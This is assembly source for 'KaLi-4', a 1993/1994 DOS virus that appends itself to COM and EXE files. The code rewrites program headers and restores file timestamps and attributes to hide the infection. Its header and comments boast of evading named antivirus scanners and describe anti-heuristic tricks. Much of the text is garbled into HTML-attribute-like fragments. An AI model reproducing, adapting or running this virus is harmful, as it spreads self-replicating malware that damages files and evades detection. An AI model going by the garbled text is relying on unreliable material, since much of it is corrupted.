

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; KaLi-4.ASM  
; AUTHOR:  K”hntark
; DATE:    18 June 1993 / updated March 1994
; Size:    approx. < 500="" bytes="" ;="" exe,com="" anti-heuristics="" infector.="" ;="" ;="" undetected="" by="" tbscan="" 6.11="" hr="" mode="" (no="" flags!)="" ;="" undetected="" by="" f-prot="" 2.11="" normal="" and="" nalyse="" modes="" ;="" undetected="" by="" antiviral="" toolkit="" pro="" 1.07="" ;="" undetected="" by="" central="" point="" antivirus="" 2.1="" normal="" and="" analyse="" modes="" ;="" ;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°="" main="" segment="" byte="" assume="" cs:main,ds:main,ss:nothing="" ;all="" part="" in="" one="" segment="com" file="" org="" 100h="" ;**********************************="" ;="" fake="" host="" program="" ;**********************************="" host:="" db="" 0e9h,0ah,00="" ;jmp="" near="" ptr="" virus="" db="" '="" '="" db="" 090h,090h,090h="" mov="" ah,4ch="" mov="" al,0="" int="" 21h="" ;terminate="" normally="" with="" dos="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" ;**********************************="" ;="" virus="" code="" starts="" here="" ;**********************************="" virus:="" mov="" si,010dh="" ;get="" starting="" address="" ;************************************="" ;="" fix="" ds="CS" es="CS" ;************************************="" mov="" al,cs:byte="" ptr="" [si="" +="" com_flag="" -="" virus]="" push="" ax="" push="" es="" ;save="" es="" and="" ds="" in="" case="" file="" is="" exe="" push="" ds="" push="" cs="" push="" cs="" pop="" es="" ;es="cs" pop="" ds="" ;ds="cs" push="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus]="" ;save="" ip="" push="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus="" +="" 2]="" ;save="" cs="" push="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus]="" ;save="" ss="" push="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus="" +="" 2]="" ;save="" sp="" push="" word="" ptr="" [si="" +="" start_code="" -="" virus]="" push="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 2]="" ;************************************="" ;="" redirect="" dta="" onto="" virus="" code="" ;************************************="" mov="" ah,1ah="" ;set="" new="" dta="" function="" to="" ds:dx="" lea="" dx,[si+="" dta="" -="" virus]="" ;put="" dta="" at="" the="" end="" of="" the="" virus="" for="" now="" int="" 21h="" ;************************************="" ;="" decrypt="" encrypted="" strings="" ;************************************="" push="" si="" cld="" mov="" cx,6d="" ;12="" bytes="" mov="" di,si="" add="" di,com_mask="" -="" virus="" add="" si,crypted_strings="" -="" virus="" die:="" movsw="" not="" word="" ptr="" [di-2]="" loop="" die="" pop="" si="" ;************************************="" ;="" main="" routines="" called="" from="" here="" ;************************************="" lea="" dx,[si="" +="" com_mask="" -="" virus]="" call="" find_file="" ;get="" a="" com="" file="" to="" attack!="" lea="" dx,[si="" +="" exe_mask="" -="" virus]="" call="" find_file="" ;get="" an="" exe="" file="" to="" attack!="" ;="cut=here===============================================================================" lea="" dx,[si="" +="" dta_file_name="" -="" virus]="" ;display="" the="" name="" of="" the="" file="" not="" mov="" byte="" ptr="" [si="" +="" dta_file_name="" -="" virus="" +="" 13],'$'="" mov="" ah,09="" int="" 21h="" ;display="" file="" name="" ;="cut=here===============================================================================" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" exit_virus:="" ;************************************="" ;="" set="" old="" dta="" address="" ;************************************="" mov="" dx,80h="" ;fix="" dta="" back="" to="" ds:dx="" mov="" ah,1ah="" int="" 21h="" ;host="" program="" pop="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 2]="" pop="" word="" ptr="" [si="" +="" start_code="" -="" virus]="" pop="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus="" +="" 2]="" ;restore="" sp="" pop="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus]="" ;restore="" ss="" pop="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus="" +="" 2]="" ;restore="" cs="" pop="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus]="" ;restore="" ip="" pop="" ds="" ;restore="" ds="" pop="" es="" ;restore="" es="" pop="" ax="" ;restore="" com_flag="" cmp="" al,00="" ;com="" infection?="" je="" restore_com="" ;************************************="" ;="" restore="" exe..="" and="" exit..="" ;************************************="" mov="" bx,ds="" ;ds="" has="" to="" be="" original="" one="" add="" bx,low="" 10h="" mov="" cx,bx="" add="" bx,cs:word="" ptr="" [si="" +="" orig_sssp="" -="" virus]="" ;restore="" ss="" cli="" mov="" ss,bx="" mov="" sp,cs:word="" ptr="" [si="" +="" orig_sssp="" -="" virus="" +="" 2]="" ;restore="" sp="" sti="" add="" cx,cs:word="" ptr="" [si="" +="" orig_ipcs="" -="" virus+="" 2]="" push="" cx="" ;push="" cs="" push="" cs:word="" ptr="" [si="" +="" orig_ipcs="" -="" virus]="" ;push="" ip="" db="" 0cbh="" ;retf="" ;************************************="" ;="" restore="" 4="" original="" bytes="" to="" file="" ;************************************="" restore_com:="" cld="" ;clear="" direction="" flag="" push="" si="" ;save="" si="" mov="" di,0100h="" add="" si,start_code="" -="" virus="" movsw="" ;shorter="" &="" faster="" than="" movsw="" ;mov="" cx,04="" and="" rep="" movsb="" pop="" si="" ;restore="" si="" ;****************************************************************="" ;="" zero="" out="" registers="" for="" return="" to="" ;="" host="" program="" ;****************************************************************="" mov="" ax,0feffh="" ;anti-tbscan="" b="" flag="" trick="" not="" ax="" ;ax="" becomes="" 0100h="" push="" ax="" xor="" ax,ax="" cwd="" xor="" di,di="" xor="" si,si="" xor="" bx,bx="" xor="" cx,cx="" ret="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" find_file:="" mov="" cx,3fh="" ;search="" for="" any="" file,="" with="" any="" attributes="" mov="" ah,4eh="" ;do="" dos="" search="" 1st="" function="" file="" mask="" a="" dx="" next_file:="" int="" 21h="" jc="" no_mo="" ;return="" if="" not="" zero="" call="" check_n_infect_file="" ;check="" file="" if="" file="" found="" mov="" ah,4fh="" ;file="" no="" good..find="" next="" function="" jmp="" short="" next_file="" ;test="" next="" file="" for="" validity="" no_mo:="" ret="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" no_good:="" jmp="" get_out="" ;-----------------------------------------------------------------------------="" check_n_infect_file:="" ;******************="" ;="" 1-check="" date="" id="" ;******************="" mov="" cx,word="" ptr="" [si="" +="" dta_file_time="" -="" virus]="" and="" cl,1dh="" cmp="" cl,1dh="" je="" no_mo="" ;*********************************************="" ;="" 2-set="" attributes="" ;*********************************************="" mov="" ax,4301h="" ;set="" file="" attributes="" to="" cx="" xor="" cx,cx="" ;set="" attributes="" to="" normal="" lea="" dx,[si="" +="" dta_file_name="" -="" virus]="" int="" 21h="" ;int="" 21h="" jc="" no_mo="" ;error..="" quit="" ;*****************="" ;="" 3-open="" file="" ;*****************="" mov="" ax,3d02h="" ;r/w="" access="" to="" it="" int="" 21h="" jc="" no_good="" ;error..="" quit="" xchg="" ax,bx="" ;bx="file" handle="" ;********************="" ;="" 4-read="" 1st="" 28="" bytes="" ;********************="" mov="" ah,3fh="" ;dos="" read="" function="" mov="" cx,28d="" ;read="" first="" 5="" bytes="" of="" file="" lea="" dx,[si="" +="" start_code="" -="" virus]="" ;store'em="" here="" int="" 21h="" jc="" no_good="" ;error?="" get="" next="" file="" ;*********************="" ;="" 5-check="" file="" ;*********************="" mov="" ax,0a5b2h="" not="" ax="" ;becomes="" zm="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus],ax="" ;exe="" file?="" je="" check_exe="" ;no?="" check="" com="" mov="" cl,8="" ror="" ax,cl="" ;becomes="" mz="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus],ax="" ;exe="" file?="" je="" check_exe="" ;no?="" check="" com="" check_com:="" mov="" ax,word="" ptr="" [si="" +="" dta_file_size="" -="" virus]="" ;get="" file's="" size="" push="" ax="" ;insert="" new="" entry="" point="" just="" in="" case..="" add="" ax,100h="" mov="" word="" ptr="" [si="" +="" 1],ax="" pop="" ax="" add="" ax,offset="" final="" -="" offset="" virus="" ;add="" virus="" size="" to="" it="" jc="" no_good="" ;bigger="" then="" 64k:nogood="" cmp="" byte="" ptr="" [si="" +="" start_code="" -="" virus],0e9h="" ;compare="" 1st="" byte="" to="" near="" jmp="" jne="" short="" infect_com="" ;not="" a="" near="" jmp,="" file="" ok="" cmp="" byte="" ptr="" [si="" +="" start_code+3="" -="" virus],20h="" ;check="" for="" '="" '="" je="" no_good="" ;file="" ok="" ..="" infect="" jmp="" short="" infect_com="" check_exe:="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 18h],40h="" ;windows="" file?="" je="" no_good="" ;no?="" check="" com="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 01ah],0="" ;internal="" overlay="" jne="" no_good="" ;yes?="" exit..="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 12h],id="" ;already="" infected?="" je="" no_good="" infect_exe:="" mov="" byte="" ptr="" [si+="" com_flag="" -="" virus],01="" ;exe="" infection="" jmp="" short="" skip="" infect_com:="" mov="" byte="" ptr="" [si+="" com_flag="" -="" virus],00="" ;com="" infection="" skip:="" ;*********************="" ;="" 6-set="" ptr="" @eof="" ;*********************="" xor="" cx,cx="" ;prepare="" to="" write="" virus="" on="" file="" xor="" dx,dx="" ;position="" file="" pointer,cx:dx="0" ;cwd="" ;position="" file="" pointer,cx:dx="0" mov="" ax,4202h="" int="" 21h="" ;locate="" pointer="" at="" end="" eof="" dos="" function="" cmp="" byte="" ptr="" [si+="" com_flag="" -="" virus],01="" ;exe="" file?="" jne="" do_com="" ;*************************="" ;="" 7-fix="" and="" write="" exe="" hdr="" ;*************************="" push="" bx="" ;save="" file="" handler="" ;-----------------------="" ;="" save="" cs:ip="" &="" ss:sp="" ;-----------------------="" push="" si="" cld="" ;clear="" direction="" flag="" lea="" di,[si="" +="" orig_sssp="" -="" virus]="" ;save="" original="" cs:ip="" at="" es:di="" lea="" si,[si="" +="" start_code="" -="" virus="" +="" 14d]="" ;from="" ds:si="" movsw="" ;save="" ss="" movsw="" ;save="" sp="" add="" si,02="" ;save="" original="" ss:sp="" movsw="" ;save="" ip="" movsw="" ;save="" cs="" pop="" si="" ;-----------------------------="" ;="" calculate="" new="" cs:ip="" ;-----------------------------="" mov="" bx,word="" ptr[si="" +="" start_code="" -="" virus="" +="" 8]="" ;header="" size="" in="" paragraphs="" mov="" cl,04="" ;multiply="" by="" 16,="" won't="" work="" with="" headers=""> 4096
        shl  bx,cl    ;bx=header size

        push ax       ;save file size at dx:ax
        push dx

        sub  ax,bx    ;file size - header size
        sbb  dx,0000h ;fix dx if carry           assures dx, ip < 16="" call="" calculate="" ;=""> mov cx,0010h, div cx

        mov  WORD PTR [si+ START_CODE - VIRUS + 12h],ID   ;put ID in checksum slot
        mov  WORD PTR [si+ START_CODE - VIRUS + 14h],ax   ;IP
        mov  WORD PTR [si+1],ax                           ;insert new starting address
        mov  WORD PTR [si+ START_CODE - VIRUS + 16h],dx   ;CS
        
;-----------------------------
; calculate & fix new SS:SP
;-----------------------------
        
        pop dx
        pop ax ;filelength in dx:ax

        add ax,OFFSET FINAL - OFFSET VIRUS ;add filesize to ax
        adc dx,0000h                       ;fix dx if carry

        push ax
        push dx
        add  ax,40h   ;if filesize + virus size is even then the stack size
        test al,01    ;even or odd stack?
        jz   EVENN
        inc  ax       ;make stack even
EVENN:
        call CALCULATE ;=> mov cx,0010h, div cx

        mov  WORD PTR [si+ START_CODE - VIRUS + 10h],ax ;SP
        mov  WORD PTR [si+ START_CODE - VIRUS + 0Eh],dx ;SS

;-----------------------------
; Calculate new file size
;-----------------------------

        pop dx
        pop ax
        
        push  ax
        mov   cl,0009h                       ;2^9 = 512
        ror   dx,cl                          ;/ 512 (sort of)
        shr   ax,cl                          ;/ 512
        stc                                  ;set carry flag
        adc   dx,ax                          ;fix dx , page count
        pop   cx
        and   ch,0001h                       ;mod 512

        mov  WORD PTR [si+ START_CODE - VIRUS + 4],dx ;page count
        mov  WORD PTR [si+ START_CODE - VIRUS + 2],cx ;save remainder

        pop  bx      ;restore file handle      

DO_COM:
        
;*********************        
; 8-Write Virus
;*********************
        
        mov  cx,OFFSET FINAL - OFFSET VIRUS      ;write virus  cx= # bytes
        mov  ah,42h                              ;<-anti cpav="" 2.1="" f-code="" trick="" mov="" dx,si="" ;write="" from="" start="" sub="" ah,2=""></-anti><-anti cpav="" 2.1="" f-code="" trick="" int="" 21h="" ;*********************="" ;="" 9-set="" ptr="" @bof="" ;*********************="" xor="" cx,cx="" xor="" dx,dx="" ;position="" file="" pointer,cx:dx="0" ;cwd="" ;position="" file="" pointer,cx:dx="0" mov="" ax,4200h="" ;locate="" pointer="" at="" beginning="" of="" int="" 21h="" ;host="" file="" cmp="" byte="" ptr="" [si+="" com_flag="" -="" virus],01="" ;exe="" file?="" jne="" do_com2="" ;*********************="" ;="" 10-write="" exe="" header="" ;*********************="" mov="" cx,26d="" ;#of="" bytes="" to="" write="" lea="" dx,[si+offset="" start_code="" -="" offset="" virus]="" ;ds:dx="pointer" of="" data="" to="" write="" jmp="" short="" cont="" do_com2:="" ;*************************************************="" ;="" 11-write="" new="" 4="" bytes="" to="" beginning="" of="" file="" (com)="" ;*************************************************="" mov="" ax,word="" ptr="" [si="" +="" dta_file_size="" -="" virus]="" sub="" ax,3="" mov="" word="" ptr="" [si="" +="" start_image+1="" -="" virus],ax="" mov="" cx,4="" ;#of="" bytes="" to="" write="" lea="" dx,[si+="" start_image="" -="" virus]="" ;ds:dx="pointer" of="" data="" to="" write="" cont:="" mov="" ah,40h="" ;dos="" write="" function="" int="" 21h="" ;write="" 5="" 28="" bytes="" ;*************************************************="" ;="" 12-restore="" date="" and="" time="" of="" file="" to="" be="" infected="" ;*************************************************="" mov="" ax,4200h="" ;anti-tbscan="" trick="" mov="" dx,word="" ptr="" [si="" +="" dta_file_date="" -="" virus]="" mov="" cx,word="" ptr="" [si="" +="" dta_file_time="" -="" virus]="" and="" cx,0ffe0h="" ;mask="" all="" but="" seconds="" or="" cl,1dh="" ;seconds="" to="" 58="" add="" ax,1501h="" ;ax="" becomes="" 5701h="" int="" 21h="" get_out:="" ;****************="" ;="" 13-close="" file="" ;****************="" mov="" ah,3eh="" int="" 21h="" ;close="" file="" ;*************************************************="" ;="" 14-restore="" file's="" attributes="" ;*************************************************="" mov="" ax,4202h="" ;set="" file="" attributes="" to="" cx="" lea="" dx,[si="" +="" dta_file_name="" -="" virus]="" ;get="" filename="" xor="" cx,cx="" mov="" cl,byte="" ptr="" [si="" +="" dta_file_attr="" -="" virus]="" ;get="" old="" attributes="" add="" ax,0ffh="" ;ax="" becomes="" 4301h="" int="" 21h="" ret="" ;infection="" done!="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" calculate:="" mov="" cl,0ch="" shl="" dx,cl="" ;dx="" *="" 4096="" mov="" bx,ax="" mov="" cl,4="" shr="" bx,cl="" ;ax="" 16="" add="" dx,bx="" ;dx="dx" *="" 4096="" +="" ax="" 16="SS" cs="" and="" ax,0fh="" ;ax="ax" and="" 0fh="SP" ip="" ret="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" name_author="" db="" 'kali-4="" k”hntark'="" crypted_strings="" db="" 0d5h,0d1h,0bch,0b0h,0b2h,0ffh="" ;'*.com',0="" db="" 0d5h,0d1h,0bah,0a7h,0bah,0ffh="" ;'*.exe',0="" start_image="" db="" 0e9h,0,0,020h="" orig_sssp="" dw="" 0,0="" orig_ipcs="" dw="" 0,0="" com_flag="" db="" 0="" ;0="COM" 1="EXE" start_code="" db="" 4="" dup="" (0)="" ;4="" bytes="" of="" com="" or="" exe="" hdr="" goes="" here="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" final:="" ;label="" of="" byte="" of="" code="" to="" be="" kept="" in="" virus="" when="" it="" moves="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" heap:="" start_code2="" db="" 24d="" dup="" (0)="" ;2nd="" part="" of="" exe="" hdr="" com_mask="" db="" 0,0,0,0,0,0="" exe_mask="" db="" 0,0,0,0,0,0="" dta="" db="" 21="" dup(0)="" ;reserved="" dta_file_attr="" db="" dta_file_time="" dw="" dta_file_date="" dw="" dta_file_size="" dd="" dta_file_name="" db="" 13="" dup(0)="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" id="" equ="" 77h="" main="" ends="" end="" host=""></-anti>